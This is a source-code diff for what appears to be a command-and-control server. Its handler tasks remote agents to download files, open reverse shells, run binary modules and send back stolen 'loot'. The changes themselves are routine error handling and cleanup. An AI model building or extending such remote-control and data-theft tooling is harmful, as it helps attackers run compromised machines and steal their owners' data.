@@ -47,7 +47,7 @@ int ConnectionInstance::manager_handler() {
         memset(tmpbf, 0, sizeof(tmpbf));
         
         // get operation request
-        if(!this->api_check(this->transport->read(this->data, &resp, 2048))) break;
+        if(!this->api_check(this->transport->read(this->data, &resp, 128))) break;
         printf("response: %s\n", resp);
         
         // parse it
@@ -91,13 +91,15 @@ int ConnectionInstance::manager_handler() {
 
             // tells the agent to download it 
             if(!AgentInformationHandler::task(AGENT_DOWN_FILE, 
-                                            dat_ptr, d_ptr)) quitting = true;
+                                            dat_ptr, d_ptr))                            
+                quitting = true;
             break;
 
             // Manager wants agent to start a reverse shell
         case MANAG_REQ_RVSH:
             if(!AgentInformationHandler::task(AGENT_REV_SHELL, 
-                                            dat_ptr, d_ptr)) quitting = true;
+                                            dat_ptr, d_ptr))
+                quitting = true;
             break;
 
             // Manager wants agent to run a binary module
@@ -113,11 +115,13 @@ int ConnectionInstance::manager_handler() {
             dat_ptr = misc_substring(ptr, count);
             
             // gets file from Manager
-            if(!this->download_file(d_ptr, 1, dat_ptr)) quitting = true;
+            if(!this->download_file(d_ptr, 1, dat_ptr)) 
+                quitting = true;
             
             // task agent
             if(!AgentInformationHandler::task(AGENT_EXEC_MODULE, 
-                                            dat_ptr, d_ptr)) quitting = true;
+                                            dat_ptr, d_ptr))                                  
+                    quitting = true;
             break;
 
             // Manager wants to check if loot is available 
@@ -169,6 +173,7 @@ int ConnectionInstance::manager_handler() {
                // Tells server tasking was successfully assigned 
                 if(!this->api_check(this->transport->send_ok(this->data)))
                     quitting = true;
+                
             } else {
                 // Tasking failed for some reason
                 if(!this->api_check(this->transport->send_err(this->data)))
@@ -188,18 +193,20 @@ int ConnectionInstance::manager_handler() {
 
             // Manager wants an agent's information
         case MANAG_GET_INFO:
-            if(!this->send_info(ptr)) quitting = true;
+            if(this->send_info(ptr)) {
+                printf("Failed get_info api check\n");
+                quitting = true;}
             break;
 
             // Manager wants all active ports on the server 
             // This is so it can connect to open agent shells
         case MANAG_REQ_PORTS:
-            if(!this->get_ports(ptr)) quitting = true;
+            if(this->get_ports(ptr)) quitting = true;
             break;
 
             // Manager wants to connect to available reverse shell
         case MANAG_CONN_RVSH:
-            this->transport->init_reverse_shell(this->data);
+            if(!this->api_check(this->transport->init_reverse_shell(this->data))) quitting = true;
             break;
 
             // Manager wants list of available transport backends
@@ -215,14 +222,16 @@ int ConnectionInstance::manager_handler() {
             // Unknown operation
         default:
             this->log("Unknown operation value '%d'\n", this->agent_name, operation);
-            this->transport->send_err(this->data);
+            if(!this->api_check(this->transport->send_err(this->data))) quitting = true;
             break;
         }
     }
 
     // free and exit
-    free(resp);
     printf("Thread exiting...\n");
+    
+    free(resp);
+    if(!this->api_check(this->transport->end(this->data))) return 1;
     
     return 0;
 }
@@ -230,7 +239,6 @@ int ConnectionInstance::manager_handler() {
 /*Sends agent information to manager*/
 int ConnectionInstance::send_info(char *ptr){
     int size = 0;
-    int rc = 0;
     char buff[BUFSIZ];
     char name[BUFSIZ];
     char *dat = NULL;
@@ -272,23 +280,29 @@ int ConnectionInstance::send_info(char *ptr){
                     // get file size
                     fseek(file, 0L, SEEK_END);
                     size = ftell(file);
-                    printf("Size: %d\n", size);
+                    //printf("Size: %d\n", size);
 
                     // Allocate file memory 
                     dat = (char *)malloc(size);
                     memset(dat, 0, size);
                     rewind(file);
                     fread(dat, 1, size, file);
-                    printf("File data: %s\n", dat);
+                    //printf("File data: %s\n", dat);
                     
                     // Write the data to transport and free it
-                    if(!this->api_check(this->transport->write(this->data, dat, size))) return 1;
+                    if(!this->api_check(this->transport->write(this->data, dat, size))) {
+                        printf("Failed API check against transport->write (file data)\n");
+                        return 1;
+                    }
                     free(dat);
 
                     
                     // get response. this is here to keep send/read order 
                     // and avoid lockups due to both ends reading together
-                    if(!this->api_check(this->transport->read(this->data, &tmpbf, 3))) return 1;
+                    if(!this->api_check(this->transport->read(this->data, &tmpbf, 3))) {
+                        printf("Failed API check against transport->read (response)\n");
+                        return 1;
+                    }
                     
                 }
             }
@@ -311,7 +325,6 @@ int ConnectionInstance::send_info(char *ptr){
 
 /* Downloads file from connected endpoint */
 int ConnectionInstance::download_file(char *ptr, int is_manager, char *extra){
-    int rc = 0;
     size_t size = 0;
     size_t size_e = 0;
     const char *data_ptr;
@@ -632,7 +645,7 @@ int ConnectionInstance::setup_transport(char *inf){
     printf("Integer ID/ports: %d, %d\n", port, id);
 
     server->listen_instance(id,port);
-    
+    return 0;
 }
 
 /* Sends loot to the manager */
@@ -643,7 +656,6 @@ int ConnectionInstance::send_loot(char *ptr){
     char tmpbf[3];
     int count;
     int ctr;
-    int rc;
     int size;
     int size_e;
     char *tmp_ptr2;
